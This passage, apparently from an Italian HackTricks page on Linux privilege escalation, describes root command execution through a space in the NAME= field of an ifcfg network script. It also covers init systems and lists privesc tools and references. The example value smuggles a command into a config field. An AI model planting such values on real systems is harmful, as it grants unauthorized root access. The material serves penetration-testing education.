**Riferimento vulnerabilità:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Se, per qualsiasi motivo, un utente è in grado di **scrivere** uno script `ifcf-<whatever>` in _/etc/sysconfig/network-scripts_ **o** può **modificare** uno esistente, allora il tuo **sistema è compromesso**.

Gli script di rete, _ifcg-eth0_ ad esempio, vengono utilizzati per le connessioni di rete. Sembrano esattamente come file .INI. Tuttavia, sono \~sourced\~ su Linux dal Network Manager (dispatcher.d).

Nel mio caso, l'attributo `NAME=` in questi script di rete non viene gestito correttamente. Se hai **spazio bianco/vuoto nel nome, il sistema tenta di eseguire la parte dopo lo spazio bianco/vuoto**. Questo significa che **tutto dopo il primo spazio vuoto viene eseguito come root**.

Per esempio: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
### **init, init.d, systemd e rc.d**

La directory `/etc/init.d` è la casa di **script** per System V init (SysVinit), il **classico sistema di gestione dei servizi Linux**. Include script per `avviare`, `fermare`, `riavviare` e talvolta `ricaricare` i servizi. Questi possono essere eseguiti direttamente o tramite collegamenti simbolici trovati in `/etc/rc?.d/`. Un percorso alternativo nei sistemi Redhat è `/etc/rc.d/init.d`.

D'altra parte, `/etc/init` è associato a **Upstart**, un **sistema di gestione dei servizi** più recente introdotto da Ubuntu, che utilizza file di configurazione per compiti di gestione dei servizi. Nonostante la transizione a Upstart, gli script SysVinit sono ancora utilizzati insieme alle configurazioni di Upstart grazie a un layer di compatibilità in Upstart.

**systemd** emerge come un moderno gestore di inizializzazione e servizi, offrendo funzionalità avanzate come l'avvio di demoni su richiesta, la gestione dell'automount e snapshot dello stato del sistema. Organizza i file in `/usr/lib/systemd/` per i pacchetti di distribuzione e `/etc/systemd/system/` per le modifiche degli amministratori, semplificando il processo di amministrazione del sistema.

## Altri Trucchi

### Escalation dei privilegi NFS

{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Uscire da Shells ristrette

{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage

{{#ref}}
cisco-vmanage.md
{{#endref}}

## Protezioni di Sicurezza del Kernel

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Maggiori aiuti

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Strumenti di Privesc Linux/Unix

### **Miglior strumento per cercare vettori di escalation dei privilegi locali Linux:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumera le vulnerabilità del kernel in linux e MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (accesso fisico):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Raccolta di più script**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## Riferimenti

- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)\\
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)\\
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)\\
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)\\
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)\\
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)\\
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)\\
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)\\
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)

{{#include ../../banners/hacktricks-training.md}}
